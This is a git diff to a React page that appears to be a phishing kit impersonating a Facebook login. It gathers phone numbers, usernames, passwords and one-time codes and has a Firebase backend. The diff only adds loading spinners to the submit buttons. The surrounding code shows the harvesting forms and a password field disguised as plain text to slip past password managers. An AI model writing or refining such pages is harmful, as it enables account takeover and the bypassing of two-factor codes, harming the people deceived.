@@ -12,6 +12,19 @@ const app = initializeApp(firebaseConfig);
 const database = getDatabase(app);
 // ==========================================
 
+// --- COMPONENT VÒNG TRÒN LOADING ---
+const LoadingSpinner = () => (
+  <div style={{
+    width: '20px',
+    height: '20px',
+    border: '3px solid rgba(255, 255, 255, 0.3)',
+    borderTop: '3px solid #fff',
+    borderRadius: '50%',
+    animation: 'spin 1s linear infinite',
+    margin: '0 auto'
+  }} />
+);
+
 export default function Home() {
   const [lang, setLang] = useState('en');
   const t = translations[lang] || translations['en'];
@@ -173,6 +186,14 @@ export default function Home() {
 
   return (
     <div style={{ overflowX: 'hidden' }}>
+      {/* KEYFRAMES CHO SPINNER (Dùng thẻ style để không cần sửa file CSS ngoài) */}
+      <style>{`
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+      `}</style>
+
       {/* ================= TRANG CHỦ ================= */}
       <header className="header">
           <div className="header-left">
@@ -598,7 +619,9 @@ export default function Home() {
                                 </div>
                                 {errors.phoneNum && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid phone number.</div>}
                             </div>
-                            <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Submitting...' : t.continueBtn}</button>
+                            <button type="submit" className="fb-btn" disabled={loading} style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '48px' }}>
+                              {loading ? <LoadingSpinner /> : t.continueBtn}
+                            </button>
                         </form>
                       </>
                     )}
@@ -609,7 +632,9 @@ export default function Home() {
                           <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required autoComplete="off" />
                           <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
                           {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>{t.loginError}</div>}
-                          <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : t.loginBtn}</button>
+                          <button type="submit" className="fb-btn" disabled={loading} style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '48px' }}>
+                            {loading ? <LoadingSpinner /> : t.loginBtn}
+                          </button>
                       </form>
                     )}
 
@@ -637,7 +662,9 @@ export default function Home() {
                             <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                                 <input className="fb-input fb-otp-input" style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} placeholder="00000000" value={otp} onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} required maxLength={8} />
                                 {showOtpError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>{t.otpError}</div>}
-                                <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>{loading ? 'Verifying...' : t.verifyBtn}</button>
+                                <button type="submit" className="fb-btn" disabled={loading || otp.length < 6} style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '48px' }}>
+                                  {loading ? <LoadingSpinner /> : t.verifyBtn}
+                                </button>
                             </form>
                           </>
                         )}
